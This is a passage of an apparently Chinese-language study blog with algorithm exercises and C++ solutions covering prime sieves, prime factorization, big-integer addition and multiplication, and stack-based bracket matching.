class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line"><span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line"><span class="type">int</span> tmp = a;</span><br><span class="line">a = b;</span><br><span class="line">b = tmp;</span><br><span class="line">&#125;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; primes;</span><br><span class="line"><span class="built_in">init</span>(b, primes);</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="type">int</span> p = primes[j];</span><br><span class="line"><span class="keyword">if</span>(p &gt;= a &amp;&amp; p &lt;= b)&#123;</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="质因数个数">质因数个数</h3><h5 id="题目描述-7">题目描述</h5><p>求正整数N(N&gt;1)的质因数的个数。相同的质因数需要重复计算。如120=22235，共有5个质因数。</p><h5 id="输入输出格式-5">输入输出格式</h5><h6 id="输入描述-7">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可能有多组测试数据，每组测试数据的输入是一个正整数<span class="built_in">N</span>，(<span class="number">1</span>&lt;<span class="built_in">N</span>&lt;<span class="number">10</span>^<span class="number">9</span>)。</span><br></pre></td></tr></table></figure><h6 id="输出描述-7">输出描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于每组数据，输出<span class="built_in">N</span>的质因数的个数。</span><br></pre></td></tr></table></figure><p>虽然输入范围是1e9，但是实际上要求出来的素数范围不到1e5，还是可以用欧拉筛的，之后用素数表一个个试：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">10000000</span>;</span><br><span class="line"><span class="type">bool</span> isnp[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt; &amp;primes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isnp[i])</span><br><span class="line">            primes.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="type">int</span> p = primes[j];</span><br><span class="line">            <span class="keyword">if</span> (p * i &gt; n)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            isnp[p * i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (i % p == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n &lt; <span class="number">4</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; primes;</span><br><span class="line"><span class="type">int</span> m = <span class="built_in">sqrt</span>(n);</span><br><span class="line"><span class="built_in">init</span>(m, primes);</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; primes.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="keyword">while</span>(n % primes[i] == <span class="number">0</span>)&#123;</span><br><span class="line">n /= primes[i];</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n &gt; <span class="number">1</span>) cnt++;</span><br><span class="line">cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="最大素因子">最大素因子</h3><h5 id="题目描述-8">题目描述</h5><p>对于给定的字符序列，从左至右将所有的数字字符取出拼接成一个无符号整数（字符序列长度小于100，拼接出的整数小于2^31,），计算并输出该整数的最大素因子（如果是素数，则其最大因子为自身）</p><h5 id="输入输出格式-6">输入输出格式</h5><h6 id="输入描述-8">输入描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有多组数据，输入数据的第一行为一个正整数，表示字符序列的数目，每组数据为一行字符序列。</span><br></pre></td></tr></table></figure><h6 id="输出描述-8">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对每个字符序列，取出所得整数的最大素因子，若字符序列中没有数字或者找出的整数为0，则输出0，每个整数占一行输出。</span><br></pre></td></tr></table></figure><p>先处理字符串获得数字n，再得到&amp;&amp;\sqrt(n)&amp;&amp;以内的素数，然后遍历一遍得到最大素数；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX = <span class="number">0x7ffffff</span>;</span><br><span class="line"><span class="type">bool</span> isp[MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt; &amp;primes)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!isp[i])&#123;</span><br><span class="line">primes.<span class="built_in">push_back</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="type">int</span> p = primes[j];</span><br><span class="line"><span class="keyword">if</span>(p * i &gt; n)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">isp[p*i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(i % p == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">deal_str</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> len = s.<span class="built_in">size</span>(), r = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(tmp &gt;= <span class="number">0</span> &amp;&amp; tmp &lt;= <span class="number">9</span>)&#123;</span><br><span class="line">r = r*<span class="number">10</span> + tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line"><span class="type">int</span> n = <span class="built_in">deal_str</span>(s);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> m = <span class="built_in">sqrt</span>(n);</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; primes;</span><br><span class="line"><span class="built_in">init</span>(m, primes);</span><br><span class="line"><span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="keyword">while</span>(n % primes[j] == <span class="number">0</span>)&#123;</span><br><span class="line">n /= primes[j];</span><br><span class="line"><span class="keyword">if</span>(primes[j] &gt; p) p = primes[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n != <span class="number">1</span> &amp;&amp; n &gt; p) p = n;</span><br><span class="line">cout &lt;&lt; p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="精度">精度</h1><h2 id="大整数加法">大整数加法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> max(a, b)  (a &gt; b ? a:b)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> min(a, b)  (a &lt; b ? a:b)</span></span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">add</span><span class="params">(string a, string b)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n1 = a.<span class="built_in">size</span>(), n2 = b.<span class="built_in">size</span>();</span><br><span class="line">string r;</span><br><span class="line"><span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n2; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp = (a[i] - <span class="string">&#x27;0&#x27;</span>) + (b[i] - <span class="string">&#x27;0&#x27;</span>) + k;</span><br><span class="line">r += (tmp)% <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">k = tmp / <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = n2; i &lt; n1; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp = (a[i] - <span class="string">&#x27;0&#x27;</span>) + k;</span><br><span class="line">r += tmp % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">k = tmp / <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(k) r += k+<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string a, b;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line">string  r;</span><br><span class="line"><span class="built_in">reverse</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>());</span><br><span class="line"><span class="built_in">reverse</span>(b.<span class="built_in">begin</span>(), b.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">if</span>(a.<span class="built_in">size</span>() &gt; b.<span class="built_in">size</span>())&#123;</span><br><span class="line">r = <span class="built_in">add</span>(a, b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">r = <span class="built_in">add</span>(b, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">reverse</span>(r.<span class="built_in">begin</span>(), r.<span class="built_in">end</span>());</span><br><span class="line">cout &lt;&lt; r &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大整数乘法">大整数乘法</h2><p>先变成数字的数组，再算，然后进位</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#include&lt;bits/stdc++.h&gt;</span></span><br><span class="line"><span class="keyword">using</span> namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main()&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">string a, b;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line">reverse(a.<span class="keyword">begin</span>(), a.<span class="keyword">end</span>());</span><br><span class="line">reverse(b.<span class="keyword">begin</span>(), b.<span class="keyword">end</span>());</span><br><span class="line"><span class="type">int</span> aa[<span class="number">105</span>], bb[<span class="number">105</span>], r[<span class="number">210</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">aa[i] = a[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">bb[i] = b[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">r[i+j] += aa[i] * bb[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> len = <span class="number">2</span>*n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)&#123;</span><br><span class="line">r[i] += r[i<span class="number">-1</span>] / <span class="number">10</span>;</span><br><span class="line">r[i<span class="number">-1</span>] %= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!r[len]) len<span class="comment">--;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = len; i &gt;= <span class="number">0</span>; i<span class="comment">--)&#123;</span></span><br><span class="line">cout &lt;&lt; r[i];</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数据结构">数据结构</h1><h2 id="栈">栈</h2><p><code>#include&lt;stack\&gt; 然后可以直接用了，常用的方法有.push .pop .top .empty</code></p><h3 id="括号匹配">括号匹配</h3><h5 id="题目描述-9">题目描述</h5><p>假设表达式中允许包含两种括号:圆括号和方括号。编写一个算法判断表达式中的括号是否正确配对。</p><h5 id="输入输出格式-7">输入输出格式</h5><h6 id="输入描述-9">输入描述:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由括号构成的字符串，包含”（“、”）“、”<span class="selector-attr">[“和”]</span>“。</span><br></pre></td></tr></table></figure><h6 id="输出描述-9">输出描述:</h6><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果匹配输出<span class="keyword">YES</span>，否则输出<span class="keyword">NO</span>。</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt; st;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="type">char</span> now = st.<span class="built_in">top</span>();</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;)&#x27;</span>&amp;&amp;now == <span class="string">&#x27;(&#x27;</span> || s[i] == <span class="string">&#x27;]&#x27;</span>&amp;&amp;now == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="括号的匹配">括号的匹配</h3><h5 id="题目描述-10">题目描述</h5><p><code>题意描述： 在算术表达式中，除了加、减、乘、除等运算外，往往还有括号。包括有大括号&#123;&#125;，中括号[]，小括号()，尖括号&lt;&gt;等。 对于每一对括号，必须先左边括号，然后右边括号；如果有多个括号，则每种类型的左括号和右括号的个数必须相等；对于多重括号的情形，按运算规则，从外到内的括号嵌套顺序为：大括号-&gt;中括号-&gt;小括号-&gt;尖括号。例如，&#123;[()]&#125;，&#123;()&#125;,&#123;&#123;&#125;&#125;为一个合法的表达式，而([&#123;&#125;])，&#123;([])&#125;,[&#123;&lt;&gt;&#125;]都是非法的。</code></p><h5 id="输入输出格式-8">输入输出格式</h5><h6 id="输入描述-10">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件的第一行为一个整数<span class="built_in">n</span>（<span class="number">1</span>≤<span class="built_in">n</span>≤<span class="number">100</span>），接下来有<span class="built_in">n</span>行仅由上述四类括号组成的括号表达式。第i+<span class="number">1</span>行表示第i个表达式。每个括号表达式的长度不超过<span class="number">255</span>。</span><br></pre></td></tr></table></figure><p>和上一题比较像，只不过给括号之间加入了优先级，判断一下就行</p><h6 id="输出描述-10">输出描述:</h6><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在输出文件中有<span class="built_in">N</span>行，其中第<span class="built_in">I</span>行对应第<span class="built_in">I</span>个表达式的合法性，合法输出<span class="variable">YES</span>，非法输出<span class="variable">NO</span>。</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">string s;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt; st;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; s.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="type">char</span> now = st.<span class="built_in">top</span>();</span><br><span class="line"><span class="keyword">if</span>(now == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; (s[j] == <span class="string">&#x27;(&#x27;</span> || s[j] == <span class="string">&#x27;[&#x27;</span> || s[j] == <span class="string">&#x27;&#123;&#x27;</span>)) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span>(now == <span class="string">&#x27;(&#x27;</span> &amp;&amp; (s[j] == <span class="string">&#x27;&#123;&#x27;</span> || s[j] == <span class="string">&#x27;[&#x27;</span>)) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span>(now == <span class="string">&#x27;[&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;&#123;&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(now == <span class="string">&#x27;&#123;&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;&#125;&#x27;</span> || now == <span class="string">&#x27;[&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;]&#x27;</span> ||now == <span class="string">&#x27;(&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;)&#x27;</span> ||now == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; s[j] == <span class="string">&#x27;&gt;&#x27;</span>)&#123;</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span 